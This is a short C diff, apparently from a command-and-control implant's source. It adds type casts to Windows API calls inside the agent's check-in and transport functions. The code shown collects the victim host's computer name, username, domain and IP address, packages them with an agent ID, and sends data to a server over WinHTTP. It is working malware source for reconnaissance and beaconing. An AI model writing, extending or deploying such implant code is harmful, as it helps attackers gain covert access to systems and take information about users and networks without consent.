@@ -53,10 +53,10 @@ BOOL TransportInit( )
     PackageAddInt32( Package, Instance.Session.AgentID );
 
     // Get Computer name
-    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
+    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, (LPDWORD) &Length ) )
     {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
+            GetComputerNameExA( ComputerNameNetBIOS, Data, (LPDWORD) &Length );
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -64,24 +64,24 @@ BOOL TransportInit( )
     // Get Username
     Length = MAX_PATH;
     if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-        GetUserNameA( Data, &Length );
+        GetUserNameA( Data, (LPDWORD) &Length );
 
     PackageAddBytes( Package, Data, strlen( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
-    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
+    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, (LPDWORD) &Length ) )
     {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
+            GetComputerNameExA( ComputerNameDnsDomain, Data, (LPDWORD) &Length );
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
 
-    GetAdaptersInfo( NULL, &Length );
+    GetAdaptersInfo( NULL, (PULONG) &Length );
     if ( ( Adapter = LocalAlloc( LPTR, Length ) ) )
     {
-        if ( GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
+        if ( GetAdaptersInfo( Adapter, (PULONG) &Length ) == NO_ERROR )
         {
             PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
 
@@ -202,7 +202,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
 
     // Send our data
-    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
+    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
     {
         if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
         {
